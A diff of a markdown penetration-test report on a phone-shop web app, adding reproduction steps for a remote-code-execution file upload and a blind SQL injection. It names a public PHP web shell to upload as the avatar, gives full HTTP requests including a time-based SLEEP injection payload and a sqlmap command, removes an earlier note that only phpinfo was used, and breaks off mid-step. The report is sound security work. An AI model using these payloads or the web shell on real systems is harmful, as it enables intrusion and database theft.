@@ -8,18 +8,19 @@
 - Vulnerabilites
   
  - Critical Impact
-    - RCE.
+    - Remote Code Execution from upload.
+    - Blind sql leading to db dump.
  
  - High Impact
-    - Buying anything!
-    - Filling Up account balance.
+    - Buying anything at any price .
+    - Filling Up account balance as integers are your friends.
     
   
   - Medium Impact
-    - Information disclosure.
+    - Information disclosure via logs.
     
   - Low Impact
-    - No rate limit.
+    - No rate limit leading to account takeover.
 
     
 ## Date
@@ -32,10 +33,14 @@ Scope was limited to: **http://foophones.securitybrigade.com:8080/**
 Vulnerabilites founded are listed according to their impact levels, explanations, and potential recommendations.
 
 ### Critical Impact
-##### RCE
+##### Remote Code Execution from upload.
 It was found that the upload functionality located at Register page is vulnerable to rce.
-Note: For the sake of poc only phpinfo file was called from the backend as it's tends to be a customer based audit.
 
+###### Steps To Reporduce:
+
+1) Visit **http://foophones.securitybrigade.com:8080/register.php** try to resgister a username and upload a file ( I added shivshell.php)
+
+2) Intercept the request in burp which shloud look some thing like,
 - Request => 
 ```
 POST /register_confirm.php HTTP/1.1
@@ -74,24 +79,133 @@ Content-Disposition: form-data; name="pass"
 
 password
 ------WebKitFormBoundary5mUqBA2v8K1dcRb0
-Content-Disposition: form-data; name="avatar"; filename="shell.php"
+Content-Disposition: form-data; name="avatar"; filename="shivshell.php"
 Content-Type: application/octet-stream
 
-<?php phpinfo(); ?>
+<?php.......
 
 ------WebKitFormBoundary5mUqBA2v8K1dcRb0--
 ```
-- Request to call the file =>
-**http://foophones.securitybrigade.com:8080/images/avatars/shell.php**
 
+3) Request the image file 
+**http://foophones.securitybrigade.com:8080/images/avatars/shivshell.php**
 
-The attack was successful as there was no restrictions in extentions and what data type was allowed.
-![Alt Text](https://i.ibb.co/k57x6LJ/screencapture-foophones-securitybrigade-8080-images-avatars-shell-php-2020-09-30-01-00-52.png)
+4) You shloud see something like this (depends on what kind of shell you upload, Used => https://raw.githubusercontent.com/The404Hacking/b374k-mini/master/b374k.php)
+![Alt Text](https://i.ibb.co/m5y1sPR/rce.png)
 
-- Recommendation:
+###### Impact:
+Attacker can upload malicious files into the backend servers and execute commands
+
+###### Recommendation:
 Uploaded data should have a proper file/extension/mime declared before passing it to the database.
 
+##### Blind sql injection leading to db dump.
+It was found that the same registration endpoint was aslo vulnerable to blind sql injection which leads to internal file dumps.
 
+###### Steps To Reproduce: 
+1) Visit **http://foophones.securitybrigade.com:8080/register.php** try toresgister a username and upload a file like above attack.
+
+2) Intercept the request in burp which shloud look some thing like,
+- Request => 
+```
+POST /register_confirm.php HTTP/1.1
+Host: foophones.securitybrigade.com:8080
+Content-Length: 768
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://foophones.securitybrigade.com:8080
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryq47yQI2jPO4y7p7J
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://foophones.securitybrigade.com:8080/register.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: _ga=GA1.2.1263643996.1601440842; PHPSESSID=snc73obo8lnvbkvmjng7q13941
+Connection: close
+
+------WebKitFormBoundaryq47yQI2jPO4y7p7J
+Content-Disposition: form-data; name="fname"
+
+shivangattacker
+------WebKitFormBoundaryq47yQI2jPO4y7p7J
+Content-Disposition: form-data; name="lname"
+
+attackershivang
+------WebKitFormBoundaryq47yQI2jPO4y7p7J
+Content-Disposition: form-data; name="country"
+
+attacker
+------WebKitFormBoundaryq47yQI2jPO4y7p7J
+Content-Disposition: form-data; name="user"
+
+attacker
+------WebKitFormBoundaryq47yQI2jPO4y7p7J
+Content-Disposition: form-data; name="pass"
+
+attacker
+------WebKitFormBoundaryq47yQI2jPO4y7p7J
+Content-Disposition: form-data; name="avatar"; filename="csrf.html"
+Content-Type: text/html
+
+Test
+
+------WebKitFormBoundaryq47yQI2jPO4y7p7J--
+```
+3) Copy the request into a txt file and pass it to sqlmap like,
+```python
+python3 sqlmap.py -r test.txt --level=3 --risk=3 --batch
+```
+
+4) Which will generate a payload for blind sqli poc like,
+- Request =>
+```
+POST /register_confirm.php HTTP/1.1
+Host: foophones.securitybrigade.com:8080
+Content-Length: 768
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://foophones.securitybrigade.com:8080
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryq47yQI2jPO4y7p7J
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://foophones.securitybrigade.com:8080/register.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: _ga=GA1.2.1263643996.1601440842; PHPSESSID=snc73obo8lnvbkvmjng7q13941
+Connection: close
+
+------WebKitFormBoundaryq47yQI2jPO4y7p7J
+Content-Disposition: form-data; name="fname"
+
+shivangattacker
+------WebKitFormBoundaryq47yQI2jPO4y7p7J
+Content-Disposition: form-data; name="lname"
+
+attackershivang
+------WebKitFormBoundaryq47yQI2jPO4y7p7J
+Content-Disposition: form-data; name="country"
+
+attacker
+------WebKitFormBoundaryq47yQI2jPO4y7p7J
+Content-Disposition: form-data; name="user"
+
+attacker' AND (SELECT 1196 FROM (SELECT(SLEEP(5)))VOOo) AND 'FrTW'='FrTW
+------WebKitFormBoundaryq47yQI2jPO4y7p7J
+Content-Disposition: form-data; name="pass"
+
+attacker
+------WebKitFormBoundaryq47yQI2jPO4y7p7J
+Content-Disposition: form-data; name="avatar"; filename="csrf.html"
+Content-Type: text/html
+
+Test
+
+------WebKitFormBoundaryq47yQI2jPO4y7p7J--
+```
+5) Above request will amke the web app to sleep for 5 sec 
+![Alt Text](https://i.ibb.co/FKQRWP7/sqlblind.png)
+
+2) Send the 
 
 ### High Impact
 
